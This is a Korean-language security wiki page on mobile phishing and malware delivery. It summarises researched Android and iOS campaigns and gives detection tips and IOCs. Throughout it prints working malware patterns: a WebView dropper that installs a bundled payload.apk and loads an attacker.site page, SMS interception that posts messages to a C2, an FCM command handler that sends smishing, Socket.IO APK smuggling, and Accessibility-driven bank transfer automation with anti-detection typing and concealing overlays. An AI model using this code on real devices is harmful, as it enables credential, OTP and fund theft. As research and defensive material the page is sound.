# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지는 위협 행위자가 phishing(SEO, social engineering, fake stores, dating apps 등)을 통해 **malicious Android APKs** 및 **iOS mobile-configuration profiles**를 배포하는 데 사용하는 기법을 다룹니다. 자료는 Zimperium zLabs(2025)가 공개한 SarangTrap 캠페인 및 기타 공개 리서치를 바탕으로 합니다.

## 공격 흐름

1. **SEO/Phishing Infrastructure**
* 유사 도메인(데이팅, cloud share, car service 등)을 다수 등록합니다.
– Google 검색 순위를 올리기 위해 `<title>` 요소에 현지 언어 키워드와 이모지를 사용합니다.
– Android(`.apk`)와 iOS 설치 지침을 동일한 랜딩 페이지에 모두 호스팅합니다.
2. **첫 단계 다운로드**
* Android: 서명되지 않았거나 “third-party store” APK로의 직접 링크.
* iOS: `itms-services://` 또는 악성 **mobileconfig** 프로파일로의 일반 HTTPS 링크(아래 참조).
3. **설치 후 social engineering**
* 최초 실행 시 앱은 **invitation / verification code**를 요구하여 독점 접근의 환상을 만듭니다.
* 코드는 **HTTP로 POST**되어 Command-and-Control(C2)로 전송됩니다.
* C2가 `{"success":true}`를 응답하면 ➜ malware가 계속 작동합니다.
* Sandbox / AV dynamic analysis가 유효한 코드를 제출하지 않으면 **malicious behaviour 없음**으로 보아 회피합니다.
4. **런타임 권한 남용** (Android)
* 위험 권한은 **C2의 긍정 응답 후에만 요청**됩니다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 최근 변종은 SMS에 대한 `<uses-permission>`을 `AndroidManifest.xml`에서 **제거**하지만, Java/Kotlin 코드 경로는 reflection으로 SMS를 읽는 로직을 남겨둠 ⇒ 정적 점수는 낮추면서 AppOps 남용이나 오래된 대상 기기에서는 여전히 동작합니다.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13은 sideloaded 앱에 대해 Restricted settings를 도입했습니다: Accessibility 및 Notification Listener 토글은 사용자가 **App info**에서 제한 설정을 명시적으로 허용할 때까지 비활성화됩니다.
* 피싱 페이지와 dropper는 이제 sideloaded 앱에 대해 **restricted settings 허용** 후 Accessibility/Notification 접근을 활성화하는 단계별 UI 지침을 제공합니다.
* 최신 우회 기법은 **session‑based PackageInstaller flow**(앱 스토어가 사용하는 동일한 방법)를 통해 페이로드를 설치하는 것입니다. Android는 해당 앱을 store‑installed로 처리하므로 Restricted settings가 Accessibility를 더 이상 차단하지 않습니다.
* 분석 힌트: dropper에서 `PackageInstaller.createSession/openSession`을 grep하고 즉시 피해자를 `ACTION_ACCESSIBILITY_SETTINGS` 또는 `ACTION_NOTIFICATION_LISTENER_SETTINGS`로 이동시키는 코드를 찾아보세요.

6. **표면 UI & 백그라운드 수집**
* 앱은 로컬로 구현된 무해한 뷰(SMS 뷰어, gallery picker 등)를 표시합니다.
* 동시에 다음을 유출합니다:
- IMEI / IMSI, 전화번호
- 전체 `ContactsContract` 덤프(JSON 배열)
- `/sdcard/DCIM`의 JPEG/PNG를 [Luban](https://github.com/Curzibn/Luban)으로 압축하여 크기 축소
- 선택적 SMS 내용(`content://sms`)
페이로드는 **배치로 압축(zip)**되어 `HTTP POST /upload.php`로 전송됩니다.
7. **iOS 전달 기법**
* 단일 **mobile-configuration profile**로 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등 요청하여 장치를 MDM 유사 감독(enroll) 상태로 만들 수 있습니다.
* 소셜 엔지니어링 지침:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* 세 번(피싱 페이지에 스크린샷 제공).
3. 서명되지 않은 프로파일을 신뢰(trust)하면 ➜ 공격자가 App Store 검토 없이 *Contacts* 및 *Photo* 권한을 획득합니다.
8. **iOS Web Clip 페이로드 (phishing app 아이콘)**
* `com.apple.webClip.managed` 페이로드는 **홈 화면에 피싱 URL을 고정(pin)** 하고 브랜디드 아이콘/라벨을 붙일 수 있습니다.
* Web Clips는 **전체 화면**으로 실행되어(브라우저 UI 숨김) **제거 불가(non‑removable)**로 표시할 수 있어, 피해자는 아이콘을 제거하려면 프로파일을 삭제해야 합니다.
9. **네트워크 레이어**
* 대개 포트 80의 plain HTTP, HOST 헤더는 `api.<phishingdomain>.com` 같은 형태.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS 없음 → 탐지 쉬움).

## Red-Team 팁

* **Dynamic Analysis Bypass** – malware 평가 시 Frida/Objection으로 invitation code 단계를 자동화하여 악성 분기까지 도달하세요.
* **Manifest vs. Runtime Diff** – `aapt dump permissions` 결과를 런타임의 `PackageManager#getRequestedPermissions()`와 비교하세요; 위험 권한이 누락된 경우는 의심 신호입니다.
* **Network Canary** – 코드 입력 후 비정상적인 POST 폭주를 탐지하려면 `iptables -p tcp --dport 80 -j NFQUEUE`를 구성하세요.
* **mobileconfig 검사** – macOS에서 `security cms -D -i profile.mobileconfig`를 사용해 `PayloadContent`를 나열하고 과도한 권한을 찾아보세요.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: 자동 우회 초대 코드</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## 지표 (일반)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

이 패턴은 정부 혜택 테마를 악용하여 인도 UPI 자격증명과 OTP를 탈취하는 캠페인에서 관찰되었습니다. 운영자는 전달과 복원력을 위해 신뢰받는 플랫폼들을 연쇄적으로 연결합니다.

### Delivery chain across trusted platforms
- YouTube 동영상 미끼 → 설명에 짧은 링크 포함
- 짧은 링크 → legit 포털을 가장한 GitHub Pages phishing 사이트
- 동일한 GitHub repo에 가짜 “Google Play” 배지가 붙은 APK가 호스팅되어 파일로 직접 연결
- 동적 phishing 페이지는 Replit에 호스팅되고; 원격 명령 채널은 Firebase Cloud Messaging (FCM)을 사용

### Dropper: embedded payload 포함 및 오프라인 설치
- 첫 번째 APK는 설치자(dropper)로, 실제 악성코드를 `assets/app.apk`에 포함하여 배포하고 클라우드 탐지를 무력화하기 위해 사용자가 Wi‑Fi/모바일 데이터를 비활성화하도록 유도합니다.
- 포함된 payload는 무해해 보이는 레이블(예: “Secure Update”)로 설치됩니다. 설치 후 설치자와 payload는 별개의 앱으로 존재합니다.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink를 통한 동적 endpoint 검색
- Malware는 shortlink에서 평문(쉼표로 구분된) live endpoints 목록을 가져오며; 간단한 문자열 변환으로 최종 phishing 페이지 경로를 생성한다.

예시 (마스킹됨):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
의사 코드:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView 기반 UPI 자격 증명 수집
- “Make payment of ₹1 / UPI‑Lite” 단계는 WebView 내부의 동적 엔드포인트에서 공격자 HTML 폼을 로드하고 민감한 필드(전화번호, 은행, UPI PIN)를 캡처한 후 이를 `POST`하여 `addup.php`로 전송합니다.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- 첫 실행 시 과도한 권한이 요청됩니다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 연락처를 순환시켜 피해자의 기기에서 smishing SMS를 대량 발송한다.
- 수신된 SMS는 broadcast receiver에 의해 가로채져 메타데이터(발신자, 본문, SIM 슬롯, 기기별 랜덤 ID)와 함께 `/addsm.php`로 업로드된다.

리시버 스케치:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM)를 통한 탄력적인 C2
- 페이로드가 FCM에 등록됩니다; 푸시 메시지는 동작을 트리거하는 스위치로 사용되는 `_type` 필드를 포함합니다(예: phishing 텍스트 템플릿 업데이트, 동작 토글).

예시 FCM 페이로드:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler 개요:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### 지표/IOCs
- APK에는 보조 페이로드가 `assets/app.apk`에 포함됨
- WebView는 `gate.htm`에서 결제를 로드하고 `/addup.php`로 데이터를 유출함
- SMS를 `/addsm.php`로 유출
- Shortlink 기반 설정 조회(예: `rebrand.ly/*`) — CSV 엔드포인트 반환
- 앱 레이블이 일반적인 “Update/Secure Update”로 표시됨
- 신뢰할 수 없는 앱에서 `_type` 판별자를 가진 FCM `data` 메시지

---

## Socket.IO/WebSocket 기반 APK 스머글링 + 가짜 Google Play 페이지

공격자들은 정적 APK 링크를 Socket.IO/WebSocket 채널로 대체해 Google Play처럼 보이는 유인 페이지에 임베드하는 경우가 늘고 있습니다. 이렇게 하면 페이로드 URL이 숨겨지고 URL/확장자 필터를 우회하며 실제 설치 UX를 유지합니다.

현장에서 관찰된 일반적인 클라이언트 흐름:

<details>
<summary>Socket.IO 가짜 Play 다운로더 (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

간단한 통제를 회피하는 이유:
- 정적 APK URL이 노출되지 않음; 페이로드는 WebSocket 프레임에서 메모리상으로 재구성됨.
- 직접 .apk 응답을 차단하는 URL/MIME/확장자 필터는 WebSockets/Socket.IO를 통해 터널링된 이진 데이터를 놓칠 수 있음.
- WebSockets를 실행하지 않는 크롤러 및 URL 샌드박스는 페이로드를 가져오지 못함.

참고: WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn 사례 연구

RatOn banker/RAT 캠페인 (ThreatFabric)은 현대 모바일 피싱 작전이 WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, 그리고 심지어 NFC-relay orchestration을 어떻게 혼합하는지 보여주는 구체적 사례다. 이 섹션은 재사용 가능한 기법들을 추상화한다.

### Stage-1: WebView → 네이티브 설치 브리지 (dropper)
공격자는 공격자 페이지를 가리키는 WebView를 띄우고 native installer를 노출하는 JavaScript 인터페이스를 주입한다. HTML 버튼을 탭하면 네이티브 코드가 호출되어 dropper의 assets에 번들된 second-stage APK를 설치하고 바로 실행한다.

최소 패턴:

<details>
<summary>Stage-1 dropper 최소 패턴 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

페이지의 HTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
설치 후, dropper는 명시적 package/activity를 통해 payload를 시작합니다:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting 아이디어: 신뢰할 수 없는 앱이 `addJavascriptInterface()`를 호출해 installer-like 메서드를 WebView에 노출시키는 경우; APK가 `assets/` 아래에 임베디드된 2차 페이로드를 포함해 배포하고 Package Installer Session API를 호출하는 경우.

### 동의 퍼널: Accessibility + Device Admin + follow-on runtime prompts
Stage-2는 “Access” 페이지를 호스팅하는 WebView를 연다. 해당 페이지의 버튼은 익스포트된 메서드를 호출하여 피해자를 Accessibility 설정으로 이동시키고 악성 서비스 활성화를 요청한다. 일단 허가되면, malware는 Accessibility를 이용해 이후 런타임 권한 대화상자(contacts, overlay, manage system settings 등)를 자동으로 클릭하여 통과시키고 Device Admin을 요청한다.

- Accessibility는 노드 트리에서 “Allow”/“OK” 같은 버튼을 찾아 클릭을 디스패치함으로써 이후 프롬프트를 프로그램적으로 수락하도록 돕는다.
- Overlay 권한 확인/요청:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
참고:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### 오버레이 phishing/ransom via WebView
운영자는 다음 명령을 실행할 수 있다:
- URL에서 전체 화면 오버레이를 렌더하거나,
- inline HTML을 전달하여 WebView 오버레이에 로드되게 한다.

가능한 사용 사례: 강요(coercion) (PIN 입력), 지갑(wallet) 열기로 PIN을 캡처, ransom 메시지 전송. 오버레이 권한이 없을 경우 권한이 부여되었는지 확인하는 명령을 유지하라.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: 주기적으로 Accessibility node tree를 덤프하고, 보이는 텍스트/역할/경계(bounds)를 직렬화하여 pseudo-screen으로 C2에 전송한다 (한 번 실행하는 `txt_screen` 및 지속적인 `screen_live` 같은 명령).
- High-fidelity: MediaProjection을 요청하고 요청 시 screen-casting/recording을 시작한다 (예: `display` / `record`).

### ATS playbook (bank app automation)
JSON 작업을 받아 은행 앱을 열고, 텍스트 쿼리와 좌표 탭을 혼합해 Accessibility를 통해 UI를 제어하며, 요청 시 피해자의 결제 PIN을 입력한다.

예시 작업:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
한 대상 흐름에서 본 예시 텍스트 (CZ → EN):
- "Nová platba" → "새 결제"
- "Zadat platbu" → "결제 입력"
- "Nový příjemce" → "새 수취인"
- "Domácí číslo účtu" → "국내 계좌 번호"
- "Další" → "다음"
- "Odeslat" → "보내기"
- "Ano, pokračovat" → "예, 계속"
- "Zaplatit" → "결제하기"
- "Hotovo" → "완료"

운영자는 `check_limit` 및 `limit` 같은 명령으로 한도 UI를 유사하게 탐색하여 이체 한도를 확인하거나 상향할 수도 있습니다.

### 암호화폐 지갑 시드 추출
대상 예: MetaMask, Trust Wallet, Blockchain.com, Phantom. 흐름: 잠금 해제(도난당한 PIN 또는 제공된 비밀번호), Security/Recovery로 이동, 시드 문구 노출/표시, keylog/exfiltrate. EN/RU/CZ/SK에 대응하는 로케일 인식 셀렉터를 구현하여 언어별 탐색을 안정화합니다.

### Device Admin 강제
Device Admin APIs는 PIN 캡처 기회를 늘리고 피해자를 괴롭히기 위해 사용됩니다:

- 즉시 잠금:
```java
dpm.lockNow();
```
- 현재 자격 증명을 만료시켜 변경을 강제 (Accessibility가 새 PIN/비밀번호를 캡처):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard의 생체 인식 기능을 비활성화하여 비생체(비-바이오메트릭) 잠금 해제를 강제:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: 많은 DevicePolicyManager 제어는 최신 Android에서 Device Owner/Profile Owner를 필요로 합니다; 일부 OEM 빌드에서는 느슨할 수 있습니다. 항상 대상 OS/OEM에서 검증하세요.

### NFC 릴레이 오케스트레이션 (NFSkate)
Stage-3는 외부 NFC-relay 모듈(예: NFSkate)을 설치하고 실행할 수 있으며 릴레이 동안 피해자를 안내하기 위한 HTML 템플릿까지 전달할 수 있습니다. 이는 온라인 ATS와 함께 비접촉 card-present cash-out을 가능하게 합니다.

배경: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### 오퍼레이터 명령 집합 (샘플)
- UI/상태: `txt_screen`, `screen_live`, `display`, `record`
- 소셜: `send_push`, `Facebook`, `WhatsApp`
- 오버레이: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- 지갑: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- 장치: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- 통신/정찰: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility 기반 ATS 안티-디텍션: 인간과 유사한 텍스트 리듬 및 이중 텍스트 주입 (Herodotus)

위협 행위자들은 점점 Accessibility 기반 자동화와 기본 행위 생체인식에 맞춘 안티-디텍션을 혼합하고 있습니다. 최근의 banker/RAT는 서로 보완적인 두 가지 텍스트 전달 모드와 무작위 리듬으로 인간 타이핑을 시뮬레이트하는 오퍼레이터 토글을 보여줍니다.

- 발견 모드: 동작하기 전에 선택자와 bounds로 표시되는 노드를 열거해 입력(ID, text, contentDescription, hint, bounds)을 정확히 타겟팅합니다.
- 이중 텍스트 주입:
- Mode 1 – `ACTION_SET_TEXT`를 대상 노드에 직접 적용 (안정적, 키보드 없음);
- Mode 2 – 클립보드 설정 + 포커스된 노드에 `ACTION_PASTE` (직접 setText가 차단될 때 작동).
- 인간과 유사한 리듬: 오퍼레이터가 제공한 문자열을 분할하여 이벤트 사이에 무작위 300–3000 ms 지연을 두고 문자 단위로 전달하여 “기계 속도 타이핑” 휴리스틱을 회피합니다. 이는 `ACTION_SET_TEXT`로 값을 점진적으로 늘리거나 문자 하나씩 붙여넣기 방식으로 구현됩니다.

<details>
<summary>Java 예시: 노드 검색 + setText 또는 clipboard+paste를 통한 문자별 지연 입력</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

사기 은폐용 차단 오버레이:
- 전체 화면의 `TYPE_ACCESSIBILITY_OVERLAY`를 렌더링하고 운영자가 제어하는 불투명도로 설정합니다; 원격 자동화가 그 아래에서 진행되는 동안 피해자에게는 불투명하게 유지합니다.
- 일반적으로 노출되는 명령: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

알파 값을 조절할 수 있는 최소 오버레이:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
자주 관찰되는 오퍼레이터 제어 프리미티브: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (화면 공유).

## 참고자료

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
